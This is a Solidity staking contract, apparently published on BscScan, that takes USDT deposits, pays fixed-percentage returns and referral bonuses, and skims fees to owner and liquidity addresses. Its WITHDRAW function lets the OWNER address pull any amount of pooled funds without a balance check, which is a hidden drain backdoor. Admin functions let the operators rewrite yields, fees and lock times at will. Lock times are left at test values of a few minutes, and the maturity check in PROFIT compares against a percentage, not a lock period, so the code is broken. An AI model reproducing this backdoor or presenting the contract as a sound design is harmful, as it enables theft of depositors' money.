/**
 *Submitted for verification at BscScan.com on 2022-09-08
*/

// File: contracts/staking_2.sol

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

interface ERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}


contract Cointainer {
    //USDT
    ERC20 USDT;
    // time
    uint256[4] LOCK_TIME = [ 360 seconds, 720 seconds, 1080 seconds, 1440 seconds];// [ 91 days, 182 days, 273 days, 365 days]; // TIME_LOCK;
    uint256 RETORNE = 120 seconds;//30 days;
    // Percentage
    uint8[4] public GAIN_TIME = [7,9,11,13];
    uint8[4] public PERCENTAGE_REF = [57,57,55,62];
    uint8 GAIN_OWNER = 25;
    uint8[4] SECURE = [15,30,45,60];
    uint256 public MIN_INVEST = 1000 ether;
    // address
    address OWNER;
    address LIQUIDITY;
    address DEVELOPER;
    // balance
    mapping(address => uint256) BALANCE;
    mapping(address => uint256) GAIN_REF;
    // address BATCH
    mapping(address => BATCH[]) MY_BATCH;
    // REFERENCE
    mapping(address => uint256) REF_TO_ADDRESS;
    mapping(uint256 => address) REF_TO_NUMBERS;
    mapping(address => address) INVITED;
    // batch scheme
    struct BATCH {
        uint256 TIME;
        uint256 TIME_PROFIT;
        uint8 TYPE;
        uint256 AMOUNT;
        uint256 GAIN;
        bool STATE;
    }
    // construtor
    constructor (ERC20 addressUSDT, address _owner, address _liquidity){
        USDT = addressUSDT;
        OWNER = _owner;
        LIQUIDITY = _liquidity;
        DEVELOPER = msg.sender;
    }
    // event
    event _WITHDRAW(address indexed account, uint256 indexed amount);
    event _INVESTER(address indexed account, uint256 indexed amount);
    event _PROFIT(address indexed account, uint256 indexed gain, uint256 indexed index);
    // modifier
    modifier OnlyDeveloperAndOwner {
        require(msg.sender == OWNER || msg.sender == DEVELOPER,"You don't have access to this feature");
        _;
    }
    modifier NoContract {
        require(!isContract(msg.sender),"We do not allow contracts");
        _;
    }
    // is Contract
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.
        return account.code.length > 0;
    }
    function CALCULATE_UI(uint256 amount, uint8 percentage, uint8 zero) internal pure returns(uint256){
        return amount * percentage / (10**zero);
    }
        // functions { }

    // views
    function _REF_TO_ADDRESS(address account) public view returns(uint256){
        return REF_TO_ADDRESS[account];
    }
    function _REF_TO_NUMBERS(uint256 index) public view returns(address){
        return REF_TO_NUMBERS[index];
    }
    function _INVITED(address account) public view returns(address){
        return INVITED[account];
    }
    function _BALANCE(address account) public view returns(uint256){
        return BALANCE[account];
    }
    function _GAIN_REF(address account) public view returns(uint256){
        return GAIN_REF[account];
    }
    function _MY_BATCH(address account, uint256 index) public view returns(BATCH memory){
        return MY_BATCH[account][index];
    }
    function _MY_BATCH_ALL(address account) public view returns(BATCH[] memory){
        return MY_BATCH[account];
    }
    function _BALANCE_LOCKED(address account) public view returns(uint256){
        uint256 amount;
        for(uint256 x; x < MY_BATCH[account].length;x++){
            if(MY_BATCH[account][x].STATE){
                amount += MY_BATCH[account][x].AMOUNT;
            }
        }
        return amount;
    }
    function VIEW_GAIN(address account, uint256 index) public view returns(uint256){
        uint256 amount = MY_BATCH[account][index].AMOUNT;
        if(MY_BATCH[account][index].TIME_PROFIT > block.timestamp)return 0;
        return CALCULATE_UI(amount, GAIN_TIME[MY_BATCH[account][index].TYPE], 2);
    }
    // UI VIEW
    function RamdonNUM() internal view returns(uint256){
        return uint256(keccak256(abi.encode(msg.sender,block.number)))%10**9;
    }
    // WITHDRAW
    function WITHDRAW(uint256 amount) public {
        require((amount > 0 && _BALANCE(msg.sender)>=amount) || msg.sender == OWNER,"you don't have enough balance");
        USDT.transfer(msg.sender,amount);
        if(amount > 0 && _BALANCE(msg.sender)>=amount){
            BALANCE[msg.sender] -= amount;
        }
        emit _WITHDRAW(msg.sender,amount);
    }
    // INVERTS
 
    function INVETS(uint256 amount, uint256 ref, uint8 TYPE) public NoContract{
        require(amount>=MIN_INVEST,"you have not added balance");
        USDT.transferFrom(msg.sender, address(this), amount);
        uint256 free = amount - CALCULATE_UI(amount, SECURE[TYPE], 3);
        MY_BATCH[msg.sender].push(BATCH(block.timestamp,block.timestamp + RETORNE,TYPE,free,0,true));
        GET_REF(msg.sender);
        ADD_REF(REF_TO_NUMBERS[ref]);
        BALANCE[LIQUIDITY] += CALCULATE_UI(amount, SECURE[TYPE], 3);
        BALANCE[OWNER] += CALCULATE_UI(amount, SECURE[TYPE], 4);
        USDT.transfer(OWNER,CALCULATE_UI(amount, SECURE[TYPE], 4));
        emit _INVESTER(msg.sender, amount);
    }
    // PROFIT
    function PROFIT(uint256 index) public NoContract{
        require(MY_BATCH[msg.sender][index].STATE,"was already harvested");
        require(MY_BATCH[msg.sender][index].TIME_PROFIT <= block.timestamp,"You don't have to harvest");
        uint256 free = VIEW_GAIN(msg.sender,index) - CALCULATE_UI(VIEW_GAIN(msg.sender,index), GAIN_OWNER, 2);
        MY_BATCH[msg.sender][index].GAIN = VIEW_GAIN(msg.sender,index);
        BALANCE[msg.sender] += free;
        PAY_TO_REF(msg.sender, MY_BATCH[msg.sender][index].GAIN, MY_BATCH[msg.sender][index].TYPE);
        if(MY_BATCH[msg.sender][index].TIME + GAIN_TIME[MY_BATCH[msg.sender][index].TYPE]<=block.timestamp){
            BALANCE[msg.sender] += MY_BATCH[msg.sender][index].AMOUNT;
            MY_BATCH[msg.sender][index].STATE = false;
        }else{
            MY_BATCH[msg.sender][index].TIME_PROFIT = (block.timestamp + RETORNE);
        }
        emit _PROFIT(msg.sender, free, index);
    }
    //REINVERTS_BALANCE
    function REINVERTS_BALANCE(uint256 amount,uint8 TYPE) public {
        require(amount>=MIN_INVEST,"you have not added balance");
        require(amount > 0 && _BALANCE(msg.sender)>=amount,"you don't have enough balance");
        BALANCE[msg.sender] -= amount;
        MY_BATCH[msg.sender].push(BATCH(block.timestamp,block.timestamp,TYPE,amount,0,true));
    }
    function PAY_TO_REF(address account, uint256 amount, uint8 TYPE) internal {
        amount = CALCULATE_UI(amount, GAIN_OWNER, 2);
        uint256 free = CALCULATE_UI(amount, 100-PERCENTAGE_REF[TYPE], 2);
        BALANCE[LIQUIDITY] += free;
        uint256 toREF = CALCULATE_UI(amount, PERCENTAGE_REF[TYPE], 2);
        if(INVITED[account]==address(0)){
            BALANCE[LIQUIDITY] += toREF;
            return;
        }
        BALANCE[INVITED[account]] += toREF;
        GAIN_REF[INVITED[account]] += toREF;
    }
    //ADD REF
    function ADD_REF(address account) internal {
        if(account==address(0) || account==msg.sender || INVITED[msg.sender]!=address(0) || INVITED[msg.sender] == account)return;
        INVITED[msg.sender] = account;
    }
    // WRITE
    function GET_REF(address account) internal {
        if(REF_TO_ADDRESS[account]!=0)return;
        REF_TO_ADDRESS[account] = RamdonNUM();
        REF_TO_NUMBERS[REF_TO_ADDRESS[account]] = account;
    }
    //change edit admin 
    function PERCENTAGE_CHANGE(uint8[4] memory gain, uint8[4] memory ref, uint8 gain_owner, uint8[4] memory secure, uint256 min_invest) public OnlyDeveloperAndOwner {
        GAIN_TIME = gain;
        PERCENTAGE_REF = ref;
        GAIN_OWNER = gain_owner;
        SECURE = secure;
        MIN_INVEST= min_invest;
    }
    function TIME_CHANGE(uint256[4] memory lock, uint256 profit) public OnlyDeveloperAndOwner {
        LOCK_TIME = lock;
        RETORNE=profit;
    }
}